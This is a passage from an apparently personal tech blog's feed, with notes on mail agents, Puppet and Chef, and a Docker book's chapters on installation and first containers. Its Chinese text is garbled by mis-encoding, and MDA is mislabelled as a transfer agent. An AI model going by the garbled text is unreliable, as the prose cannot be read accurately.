MUA.</p><p>ç”¨äºä¿å­˜ç”¨æˆ·é‚®ä»¶çš„â€ä¿¡ç®±â€æœåŠ¡å™¨å«<mark>é‚®ä»¶æŠ•é€’ä»£ç†</mark>(Mail Transfer Agent) å³ MDA. å…¶å°†<mark>é‚®ä»¶ä¼ è¾“ä»£ç†</mark>(Mail Transfer Agent) å³ MTA çš„é‚®ä»¶ä¿å­˜åœ¨æœ¬åœ°ã€‚</p><p>éƒ¨ç½²é‚®ä»¶ç³»ç»Ÿéœ€æ³¨æ„:</p><ul><li>æ·»åŠ ååƒåœ¾å’Œåç—…æ¯’æ¨¡å—</li><li>å¯¹é‚®ä»¶åŠ å¯†</li><li>æ·»åŠ é‚®ä»¶ç›‘æ§å®¡æ ¸æ¨¡å—</li><li>ä¿éšœç¨³å®šæ€§</li></ul><h2 id="15-2-éƒ¨ç½²åŸºç¡€çš„ç”µå­é‚®ä»¶ç³»ç»Ÿ"><a href="#15-2-éƒ¨ç½²åŸºç¡€çš„ç”µå­é‚®ä»¶ç³»ç»Ÿ" class="headerlink" title="15.2 éƒ¨ç½²åŸºç¡€çš„ç”µå­é‚®ä»¶ç³»ç»Ÿ"></a>15.2 éƒ¨ç½²åŸºç¡€çš„ç”µå­é‚®ä»¶ç³»ç»Ÿ</h2><h3 id="15-1-2-é…ç½®-Postfix-æœåŠ¡ç¨‹åº"><a href="#15-1-2-é…ç½®-Postfix-æœåŠ¡ç¨‹åº" class="headerlink" title="15.1.2 é…ç½® Postfix æœåŠ¡ç¨‹åº"></a>15.1.2 é…ç½® Postfix æœåŠ¡ç¨‹åº</h3>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>åœ¨ Ubuntu å®¹å™¨ä¸­ä¸‹è½½ ip ç­‰å‘½ä»¤</title>
    <link href="/2022/08/25/%E5%9C%A8-Ubuntu-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%B8%8B%E8%BD%BD-ip-%E7%AD%89%E5%91%BD%E4%BB%A4/"/>
    <url>/2022/08/25/%E5%9C%A8-Ubuntu-%E5%AE%B9%E5%99%A8%E4%B8%AD%E4%B8%8B%E8%BD%BD-ip-%E7%AD%89%E5%91%BD%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">apt-<span class="hljs-built_in">get</span> update<br>apt-<span class="hljs-built_in">get</span> install net-tools iputils-ping iproute2<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Puppet, Chef å·¥å…·</title>
    <link href="/2022/08/25/Puppet-Chef-%E5%B7%A5%E5%85%B7/"/>
    <url>/2022/08/25/Puppet-Chef-%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>puppet ä½¿ç”¨è‡ªæœ‰çš„ puppet æè¿°è¯­è¨€ï¼Œå¯ç®¡ç†é…ç½®æ–‡ä»¶ã€ç”¨æˆ·ã€cronä»»åŠ¡ã€è½¯ä»¶åŒ…ã€ç³»ç»ŸæœåŠ¡ç­‰.</p><p>puppet é‡‡ç”¨ Client&#x2F;Server ç»“æ„ï¼Œæ‰€æœ‰å®¢æˆ·ç«¯å’Œä¸€ä¸ªæˆ–å‡ ä¸ªæœåŠ¡å™¨äº¤äº’ã€‚æ¯ä¸ªå®¢æˆ·ç«¯å‘¨æœŸæ€§(é»˜è®¤ä¸ºåŠä¸ªå°æ—¶)å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œè·å¾—å…¶æœ€æ–°çš„é…ç½®ä¿¡æ¯ï¼Œä¿è¯å’Œè¯¥é…ç½®ä¿¡æ¯åŒæ­¥ã€‚é…ç½®å®Œæˆåï¼Œpuppet å®¢æˆ·ç«¯å¯ä»¥åé¦ˆç»™æœåŠ¡å™¨ç«¯ä¸€ä¸ªæ¶ˆæ¯ã€‚</p><h1 id="è¿è¡Œæ¨¡å¼"><a href="#è¿è¡Œæ¨¡å¼" class="headerlink" title="è¿è¡Œæ¨¡å¼"></a>è¿è¡Œæ¨¡å¼</h1><p>æœ‰ä¸¤ç§è¿è¡Œæ¨¡å¼:</p><ul><li>standalone æ¨¡å¼: åœ¨å•å°æœåŠ¡å™¨ä¸Šåˆ¶å®šè§„åˆ™ï¼Œåªèƒ½åœ¨å•å°æœåŠ¡å™¨ä¸Šè¿è¡Œ</li><li>master&#x2F;agent æ¨¡å¼: master åˆ¶å®šè§„åˆ™ï¼Œå¯ä»¥æ¨é€åˆ°å¤šå° agent æœåŠ¡å™¨ä¸Šè¿è¡Œ</li></ul>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux å·¥å…· strace, perf, å’Œ /proc</title>
    <link href="/2022/08/25/Linux-%E5%B7%A5%E5%85%B7-strace-perf-%E5%92%8C-proc/"/>
    <url>/2022/08/25/Linux-%E5%B7%A5%E5%85%B7-strace-perf-%E5%92%8C-proc/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ç¬¬ä¸€æœ¬ Docker ä¹¦</title>
    <link href="/2022/08/25/%E7%AC%AC%E4%B8%80%E6%9C%AC-Docker-%E4%B9%A6/"/>
    <url>/2022/08/25/%E7%AC%AC%E4%B8%80%E6%9C%AC-Docker-%E4%B9%A6/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬1ç« -ç®€ä»‹"><a href="#ç¬¬1ç« -ç®€ä»‹" class="headerlink" title="ç¬¬1ç«  ç®€ä»‹"></a>ç¬¬1ç«  ç®€ä»‹</h1><p>å®¹å™¨(container) å’Œ ç®¡ç†ç¨‹åºè™šæ‹ŸåŒ–(hypervisor virtualization) ä¸åŒ:</p><ul><li>HV, é€šè¿‡ä¸­é—´å±‚å°†ä¸€å°æˆ–å¤šå°ç‹¬ç«‹çš„æœºå™¨è™šæ‹Ÿè¿è¡Œäºç‰©ç†ç¡¬ä»¶ä¹‹ä¸Š</li><li>Container, ç›´æ¥è¿è¡Œåœ¨æ“ä½œç³»ç»Ÿå†…æ ¸ä¹‹ä¸Šçš„ç”¨æˆ·ç©ºé—´</li></ul><p>å®¹å™¨åªèƒ½è¿è¡Œä¸åº•å±‚å®¿ä¸»æœºç›¸åŒæˆ–ç›¸ä¼¼çš„æ“ä½œç³»ç»Ÿã€‚</p><p>Docker æ˜¯ä¸ºæ”¹å˜å®¹å™¨çš„å¤æ‚æ€§ã€‚</p><h2 id="1-1-Docker-ç®€ä»‹"><a href="#1-1-Docker-ç®€ä»‹" class="headerlink" title="1.1 Docker ç®€ä»‹"></a>1.1 Docker ç®€ä»‹</h2><p>Docker æ˜¯ä¸€ä¸ªèƒ½å¤ŸæŠŠå¼€å‘çš„åº”ç”¨ç¨‹åºè‡ªåŠ¨éƒ¨ç½²åˆ°å®¹å™¨çš„å¼€æºå¼•æ“ã€‚æ‰€ä»¥è¯´æ˜¯å’Œå®¹å™¨ç›¸å…³è”ã€‚</p><p>Docker åœ¨è™šæ‹ŸåŒ–çš„å®¹å™¨æ‰§è¡Œç¯å¢ƒä¸­å¢åŠ äº†ä¸€ä¸ªåº”ç”¨ç¨‹åºéƒ¨ç½²å¼•æ“ã€‚</p><h3 id="1-1-1-æä¾›ä¸€ä¸ªç®€å•ã€è½»é‡çš„å»ºæ¨¡æ–¹å¼"><a href="#1-1-1-æä¾›ä¸€ä¸ªç®€å•ã€è½»é‡çš„å»ºæ¨¡æ–¹å¼" class="headerlink" title="1.1.1 æä¾›ä¸€ä¸ªç®€å•ã€è½»é‡çš„å»ºæ¨¡æ–¹å¼"></a>1.1.1 æä¾›ä¸€ä¸ªç®€å•ã€è½»é‡çš„å»ºæ¨¡æ–¹å¼</h3><p>Docker ä¾èµ–äºâ€å†™æ—¶å¤åˆ¶â€æ¨¡å‹ã€‚</p><h3 id="1-1-2-èŒè´£çš„é€»è¾‘åˆ†ç¦»"><a href="#1-1-2-èŒè´£çš„é€»è¾‘åˆ†ç¦»" class="headerlink" title="1.1.2 èŒè´£çš„é€»è¾‘åˆ†ç¦»"></a>1.1.2 èŒè´£çš„é€»è¾‘åˆ†ç¦»</h3><h3 id="1-1-3-å¿«é€Ÿã€é«˜æ•ˆçš„å¼€å‘ç”Ÿå‘½å‘¨æœŸ"><a href="#1-1-3-å¿«é€Ÿã€é«˜æ•ˆçš„å¼€å‘ç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="1.1.3 å¿«é€Ÿã€é«˜æ•ˆçš„å¼€å‘ç”Ÿå‘½å‘¨æœŸ"></a>1.1.3 å¿«é€Ÿã€é«˜æ•ˆçš„å¼€å‘ç”Ÿå‘½å‘¨æœŸ</h3><h3 id="1-1-4-é¼“åŠ±ä½¿ç”¨é¢å‘æœåŠ¡çš„æ¶æ„"><a href="#1-1-4-é¼“åŠ±ä½¿ç”¨é¢å‘æœåŠ¡çš„æ¶æ„" class="headerlink" title="1.1.4 é¼“åŠ±ä½¿ç”¨é¢å‘æœåŠ¡çš„æ¶æ„"></a>1.1.4 é¼“åŠ±ä½¿ç”¨é¢å‘æœåŠ¡çš„æ¶æ„</h3><h2 id="1-2-Docker-ç»„ä»¶"><a href="#1-2-Docker-ç»„ä»¶" class="headerlink" title="1.2 Docker ç»„ä»¶"></a>1.2 Docker ç»„ä»¶</h2><p>æ ¸å¿ƒç»„ä»¶:</p><ul><li>Docker å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ï¼Œä¹Ÿç§°ä¸º Docker å¼•æ“</li><li>Docker é•œåƒ</li><li>Registry</li><li>Docker å®¹å™¨</li></ul><h3 id="1-2-1-Docker-å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨"><a href="#1-2-1-Docker-å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨" class="headerlink" title="1.2.1 Docker å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨"></a>1.2.1 Docker å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨</h3><p>Docker æ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯&#x2F;æœåŠ¡å™¨(C&#x2F;S)æ¶æ„çš„ç¨‹åºã€‚</p><p>Docker æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…· docker ä»¥åŠä¸€æ•´å¥— RESTFUL API æ¥ä¸å®ˆæŠ¤è¿›ç¨‹äº¤äº’ã€‚</p><h3 id="1-2-2-Docker-é•œåƒ"><a href="#1-2-2-Docker-é•œåƒ" class="headerlink" title="1.2.2 Docker é•œåƒ"></a>1.2.2 Docker é•œåƒ</h3><p>ç”¨æˆ·åŸºäºé•œåƒæ¥è¿è¡Œè‡ªå·±çš„å®¹å™¨ã€‚</p><p>å¯ä»¥æŠŠé•œåƒå½“åšå®¹å™¨çš„â€æºä»£ç â€.</p><h3 id="1-2-3-Registry"><a href="#1-2-3-Registry" class="headerlink" title="1.2.3 Registry"></a>1.2.3 Registry</h3><p>Docker ç”¨ Registry æ¥ä¿å­˜ç”¨æˆ·æ„å»ºçš„é•œåƒã€‚</p><p>Registry åˆ†ä¸ºå…¬æœ‰å’Œç§æœ‰ä¸¤ç§ã€‚</p><p>å¯åœ¨ Docker Hub ä¸Šä¿å­˜è‡ªå·±çš„ç§æœ‰é•œåƒã€‚</p><h3 id="1-2-4-å®¹å™¨"><a href="#1-2-4-å®¹å™¨" class="headerlink" title="1.2.4 å®¹å™¨"></a>1.2.4 å®¹å™¨</h3><p>Docker å¯ä»¥å¸®ç”¨æˆ·æ„å»ºå’Œéƒ¨ç½²å®¹å™¨ï¼Œç”¨æˆ·åªéœ€è¦æŠŠè‡ªå·±çš„åº”ç”¨ç¨‹åºæˆ–æœåŠ¡æ‰“åŒ…æ”¾è¿›å®¹å™¨å³å¯ã€‚</p><p>Docker å®¹å™¨æ˜¯:</p><ul><li>ä¸€ä¸ªé•œåƒæ ¼å¼</li><li>ä¸€ç³»åˆ—æ ‡å‡†çš„æ“ä½œ</li><li>ä¸€ä¸ªæ‰§è¡Œç¯å¢ƒ</li></ul><p>Docker å€Ÿé‰´äº†é›†è£…ç®±çš„æ¦‚å¿µï¼Œé›†è£…ç®±è¿è¾“è´§ç‰©ï¼ŒDocker è¿è¾“è½¯ä»¶ã€‚Docker æ˜¯è¿è¾“å·¥, å¯¹å®¹å™¨è¿›è¡Œæ“ä½œã€‚</p><p>æ¯ä¸ªå®¹å™¨éƒ½åŒ…å«ä¸€ä¸ªè½¯ä»¶é•œåƒï¼Œä¹Ÿå°±æ˜¯å®¹å™¨çš„â€è´§ç‰©â€.</p><p>æ‰€æœ‰å®¹å™¨éƒ½æŒ‰ç…§ç›¸åŒçš„æ–¹å¼å°†å†…å®¹â€è£…è½½â€è¿›å»ï¼Œ</p><h2 id="1-3-èƒ½ç”¨-Docker-åšä»€ä¹ˆ"><a href="#1-3-èƒ½ç”¨-Docker-åšä»€ä¹ˆ" class="headerlink" title="1.3 èƒ½ç”¨ Docker åšä»€ä¹ˆ"></a>1.3 èƒ½ç”¨ Docker åšä»€ä¹ˆ</h2><p>å®¹å™¨å¯ä»¥ä¸ºå„ç§æµ‹è¯•æä¾›å¾ˆå¥½çš„æ²™ç›’ç¯å¢ƒ.</p><h2 id="1-4-Docker-ä¸é…ç½®ç®¡ç†"><a href="#1-4-Docker-ä¸é…ç½®ç®¡ç†" class="headerlink" title="1.4 Docker ä¸é…ç½®ç®¡ç†"></a>1.4 Docker ä¸é…ç½®ç®¡ç†</h2><p>Docker å¾ˆè½»é‡: é•œåƒæ˜¯åˆ†å±‚çš„ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œè¿…é€Ÿçš„è¿­ä»£.</p><p>Docker ä¸€ä¸ªæ˜¾è‘—ç‰¹ç‚¹å°±æ˜¯ï¼Œå¯¹ä¸åŒçš„å®¿ä¸»æœºã€åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ï¼Œå¯èƒ½ä¼šè¡¨ç°å‡ºä¸åŒçš„ç‰¹æ€§ä¸æ¶æ„ã€‚</p><h2 id="1-5-Docker-çš„æŠ€æœ¯ç»„ä»¶"><a href="#1-5-Docker-çš„æŠ€æœ¯ç»„ä»¶" class="headerlink" title="1.5 Docker çš„æŠ€æœ¯ç»„ä»¶"></a>1.5 Docker çš„æŠ€æœ¯ç»„ä»¶</h2><h1 id="ç¬¬2ç« -å®‰è£…-Docker"><a href="#ç¬¬2ç« -å®‰è£…-Docker" class="headerlink" title="ç¬¬2ç«  å®‰è£… Docker"></a>ç¬¬2ç«  å®‰è£… Docker</h1><h2 id="2-1-å®‰è£…-Docker-çš„å…ˆå†³æ¡ä»¶"><a href="#2-1-å®‰è£…-Docker-çš„å…ˆå†³æ¡ä»¶" class="headerlink" title="2.1 å®‰è£… Docker çš„å…ˆå†³æ¡ä»¶"></a>2.1 å®‰è£… Docker çš„å…ˆå†³æ¡ä»¶</h2><h2 id="2-2-åœ¨-Ubuntu-å’Œ-Debian-ä¸­å®‰è£…-Docker"><a href="#2-2-åœ¨-Ubuntu-å’Œ-Debian-ä¸­å®‰è£…-Docker" class="headerlink" title="2.2 åœ¨ Ubuntu å’Œ Debian ä¸­å®‰è£… Docker"></a>2.2 åœ¨ Ubuntu å’Œ Debian ä¸­å®‰è£… Docker</h2><h3 id="2-2-1-æ£€æŸ¥å‰ææ¡ä»¶"><a href="#2-2-1-æ£€æŸ¥å‰ææ¡ä»¶" class="headerlink" title="2.2.1 æ£€æŸ¥å‰ææ¡ä»¶"></a>2.2.1 æ£€æŸ¥å‰ææ¡ä»¶</h3><h4 id="1-å†…æ ¸"><a href="#1-å†…æ ¸" class="headerlink" title="1. å†…æ ¸"></a>1. å†…æ ¸</h4><p>ä½¿ç”¨:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">uname</span> -a</span><br></code></pre></td></tr></table></figure><p>è‹¥ä¸‹è½½æ–°å†…æ ¸ï¼Œå¯ä½¿ç”¨å‘½ä»¤åŠ è½½æ–°å†…æ ¸:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> sudo <span class="hljs-built_in">update-grub</span><br><span class="hljs-variable">$</span> reboot<br></code></pre></td></tr></table></figure><h4 id="2-æ£€æŸ¥-Device-Mapper"><a href="#2-æ£€æŸ¥-Device-Mapper" class="headerlink" title="2. æ£€æŸ¥ Device Mapper"></a>2. æ£€æŸ¥ Device Mapper</h4><p>ä½¿ç”¨ Device Mapper ä½œä¸ºå­˜å‚¨é©±åŠ¨ã€‚</p><p>Device Mapper æ”¯æŒâ€è‡ªåŠ¨ç²¾ç®€é…ç½®â€(thin-provisioning)çš„æ¦‚å¿µï¼Œå¯ä»¥åœ¨ä¸€ç§æ–‡ä»¶ç³»ç»Ÿä¸­å­˜å‚¨å¤šå°è™šæ‹Ÿè®¾å¤‡(Dockeré•œåƒä¸­çš„å±‚).</p><p>ç¡®è®¤æ˜¯å¦å®‰è£…:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ ls -l <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/misc/</span>device-mapper<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ sudo <span class="hljs-keyword">grep</span> device-mapper <span class="hljs-regexp">/proc/</span>devices<br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo modprobe dm_mod<br></code></pre></td></tr></table></figure><h3 id="2-2-2-å®‰è£…-Docker"><a href="#2-2-2-å®‰è£…-Docker" class="headerlink" title="2.2.2 å®‰è£… Docker"></a>2.2.2 å®‰è£… Docker</h3><p>åˆ°<a href="https://docs.docker.com/engine/install/ubuntu/">å®˜ç½‘</a>æŸ¥çœ‹.</p><h3 id="2-2-3-Docker-ä¸-UFW"><a href="#2-2-3-Docker-ä¸-UFW" class="headerlink" title="2.2.3 Docker ä¸ UFW"></a>2.2.3 Docker ä¸ UFW</h3><p>UWF å³ Uncomplicated Firewall.</p><p>Docker ä½¿ç”¨ä¸€ä¸ªç½‘æ¡¥æ¥ç®¡ç†å®¹å™¨ä¸­çš„ç½‘ç»œã€‚</p><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒUFW ä¼šä¸¢å¼ƒæ‰€æœ‰è½¬å‘çš„æ•°æ®åŒ…ï¼Œå› æ­¤éœ€è¦åœ¨ UFW ä¸­å¯ç”¨æ•°æ®åŒ…çš„è½¬å‘.</p><p>ä¿®æ”¹ <code>/etc/default/ufw</code> æ–‡ä»¶:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">DEFAULT_FORWARD_POLICY</span>=<span class="hljs-string">&quot;DROP&quot;</span><br></code></pre></td></tr></table></figure><p>æ”¹ä¸º:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">DEFAULT_FORWARD_POLICY</span>=<span class="hljs-string">&quot;ACCEPT&quot;</span><br></code></pre></td></tr></table></figure><p>é‡æ–°åŠ è½½:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo ufw reload<br></code></pre></td></tr></table></figure><h2 id="2-9-Docker-å®ˆæŠ¤è¿›ç¨‹"><a href="#2-9-Docker-å®ˆæŠ¤è¿›ç¨‹" class="headerlink" title="2.9 Docker å®ˆæŠ¤è¿›ç¨‹"></a>2.9 Docker å®ˆæŠ¤è¿›ç¨‹</h2><p>ç”¨æˆ·å¯ä»¥ä½¿ç”¨ <code>docker daemon</code> å‘½ä»¤æ§åˆ¶ Docker å®ˆæŠ¤è¿›ç¨‹ã€‚</p><p>å®ˆæŠ¤è¿›ç¨‹ç›‘å¬ <code>/var/run/docker.sock</code> è¿™ä¸ª UNIXå¥—æ¥å­—æ–‡ä»¶ï¼Œæ¥è·å–æ¥è‡ªå®¢æˆ·ç«¯çš„ Docker è¯·æ±‚ã€‚</p><h3 id="2-9-1-é…ç½®-Docker-å®ˆæŠ¤è¿›ç¨‹"><a href="#2-9-1-é…ç½®-Docker-å®ˆæŠ¤è¿›ç¨‹" class="headerlink" title="2.9.1 é…ç½® Docker å®ˆæŠ¤è¿›ç¨‹"></a>2.9.1 é…ç½® Docker å®ˆæŠ¤è¿›ç¨‹</h3><p>ç”¨ <code>-H</code> æ ‡å¿—è°ƒæ•´å®ˆæŠ¤è¿›ç¨‹ç»‘å®šç›‘å¬æ¥å£çš„æ–¹å¼, å¯ä»¥ä½¿ç”¨ <code>-H</code> æ ‡å¿—æŒ‡å®šä¸åŒçš„ç½‘ç»œæ¥å£å’Œç«¯å£é…ç½®:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker daemon -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>-D</code> å‚æ•°æ¥è¾“å‡º Docker å®ˆæŠ¤è¿›ç¨‹çš„è¯¦ç»†ä¿¡æ¯:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo docker daemon -D<br></code></pre></td></tr></table></figure><h2 id="2-10-å‡çº§-Docker"><a href="#2-10-å‡çº§-Docker" class="headerlink" title="2.10 å‡çº§ Docker"></a>2.10 å‡çº§ Docker</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ sudo apt-<span class="hljs-built_in">get</span> update<br>$ sudo apt-<span class="hljs-built_in">get</span> install docker-engine<br></code></pre></td></tr></table></figure><h2 id="2-11-Docker-ç”¨æˆ·ç•Œé¢"><a href="#2-11-Docker-ç”¨æˆ·ç•Œé¢" class="headerlink" title="2.11 Docker ç”¨æˆ·ç•Œé¢"></a>2.11 Docker ç”¨æˆ·ç•Œé¢</h2><h1 id="ç¬¬3ç« -Docker-å…¥é—¨"><a href="#ç¬¬3ç« -Docker-å…¥é—¨" class="headerlink" title="ç¬¬3ç«  Docker å…¥é—¨"></a>ç¬¬3ç«  Docker å…¥é—¨</h1><h2 id="3-1-ç¡®ä¿-Docker-å·²ç»å°±ç»ª"><a href="#3-1-ç¡®ä¿-Docker-å·²ç»å°±ç»ª" class="headerlink" title="3.1 ç¡®ä¿ Docker å·²ç»å°±ç»ª"></a>3.1 ç¡®ä¿ Docker å·²ç»å°±ç»ª</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">$ sudo docker <span class="hljs-meta">info</span><br></code></pre></td></tr></table></figure><h2 id="3-2-è¿è¡Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå®¹å™¨"><a href="#3-2-è¿è¡Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå®¹å™¨" class="headerlink" title="3.2 è¿è¡Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå®¹å™¨"></a>3.2 è¿è¡Œæˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªå®¹å™¨</h2><p><code>docker run</code> å‘½ä»¤æä¾›äº† Docker å®¹å™¨çš„åˆ›å»ºåˆ°å¯åŠ¨çš„åŠŸèƒ½ã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>docker help run</code> è·å–å‘½ä»¤åˆ—è¡¨ã€‚</p><p>ä½¿ç”¨ <code>man</code> é¡µ, <code>man docker-run</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo docker run -i -t ubuntu <span class="hljs-regexp">/bin/</span>bash<br></code></pre></td></tr></table></figure><p><code>-i</code> å‚æ•°ä¿è¯å®¹å™¨ä¸­ STDIN æ˜¯å¼€å¯çš„ã€‚</p><p><code>-t</code> å‚æ•°å‘Šè¯‰ Docker ä¸ºè¦åˆ›å»ºçš„å®¹å™¨åˆ†é…ä¸€ä¸ªä¼ª tty ç»ˆç«¯.</p><p><code>ubuntu</code> æ˜¯ç”¨æ¥å‘Šè¯‰ Docker åŸºäºä»€ä¹ˆé•œåƒæ¥åˆ›å»ºå®¹å™¨ï¼Œ<code>ubuntu</code> é•œåƒæ˜¯ä¸€ä¸ªå¸¸å¤‡é•œåƒï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºâ€åŸºç¡€â€(base) é•œåƒï¼Œç”± Docker å…¬å¸æä¾›ï¼Œä¿å­˜åœ¨ Docker Hub Registry ä¸Šã€‚</p><p>Docker ä¼šæ£€æŸ¥æœ¬åœ°æ˜¯å¦å­˜åœ¨ <code>ubuntu</code> é•œåƒï¼Œå¦‚æœæ²¡æœ‰ï¼ŒDocker å°±ä¼šè¿æ¥å®˜æ–¹ç»´æŠ¤çš„ Docker Hub Registry, æŸ¥çœ‹ Docker Hub ä¸­æ˜¯å¦å­˜åœ¨è¯¥é•œåƒï¼ŒDocker ä¸€æ—¦æ‰¾åˆ°è¯¥é•œåƒï¼Œå°±ä¼šä¸‹è½½åˆ°æœ¬åœ°ã€‚</p><p>éšåï¼ŒDocker åœ¨æ–‡ä»¶ç³»ç»Ÿå†…éƒ¨ç”¨è¿™ä¸ªé•œåƒåˆ›å»ºäº†ä¸€ä¸ªæ–°å®¹å™¨ï¼Œè¯¥å®¹å™¨æ‹¥æœ‰è‡ªå·±çš„ ç½‘ç»œã€IPåœ°å€ï¼Œä»¥åŠä¸€ä¸ªç”¨æ¥å’Œå®¿ä¸»æœºè¿›è¡Œé€šä¿¡çš„æ¡¥æ¥ç½‘ç»œæ¥å£ã€‚</p><p><code>/bin/bash</code> æ˜¯æˆ‘ä»¬å‘Šè¯‰ Docker åœ¨å®¹å™¨ä¸­è¿è¡Œçš„å‘½ä»¤ã€‚</p><h2 id="3-3-ä½¿ç”¨ç¬¬ä¸€ä¸ªå®¹å™¨"><a href="#3-3-ä½¿ç”¨ç¬¬ä¸€ä¸ªå®¹å™¨" class="headerlink" title="3.3 ä½¿ç”¨ç¬¬ä¸€ä¸ªå®¹å™¨"></a>3.3 ä½¿ç”¨ç¬¬ä¸€ä¸ªå®¹å™¨</h2><p>æˆ‘è¿›å…¥çš„ç•Œé¢ä¸º:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@895508d7a56f</span><span class="hljs-symbol">:/</span><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>root</code> ä¸º root è´¦æˆ·ï¼Œ<code>895508d7a56f</code> ä¸ºå®¹å™¨ ID(å³ä¸»æœºå). å…¶ä¸ºä¸€ä¸ªå®Œæ•´çš„ Ubuntu ç³»ç»Ÿã€‚</p><p>è·å–ä¸»æœºå:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@895508d7a56f</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># hostname</span><br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹å®¹å™¨çš„ç½‘ç»œé…ç½®:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">root<span class="hljs-variable">@895508d7a56f</span><span class="hljs-symbol">:/</span><span class="hljs-comment"># ip a</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>exit</code> å‘½ä»¤å¯ä»¥é€€å‡ºå®¹å™¨ã€‚</p><p><code>docker ps -a</code> æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­å®¹å™¨çš„åˆ—è¡¨ã€‚</p><p><code>docker ps -l</code> åˆ—å‡ºæœ€åä¸€ä¸ªè¿è¡Œçš„å®¹å™¨ã€‚</p><p>æœ‰ä¸‰ç§æ–¹å¼å¯ä»¥å”¯ä¸€æŒ‡å®šå®¹å™¨:</p><ul><li>çŸ­ UUID</li><li>é•¿ UUID</li><li>åç§°</li></ul><h2 id="3-4-å®¹å™¨å‘½å"><a href="#3-4-å®¹å™¨å‘½å" class="headerlink" title="3.4 å®¹å™¨å‘½å"></a>3.4 å®¹å™¨å‘½å</h2><p>Docker ä¼šä¸ºæˆ‘ä»¬åˆ›å»ºçš„æ¯ä¸€ä¸ªå®¹å™¨è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªéšæœºçš„åç§°ã€‚</p><p>ä½¿ç”¨ <code>--name</code> æ 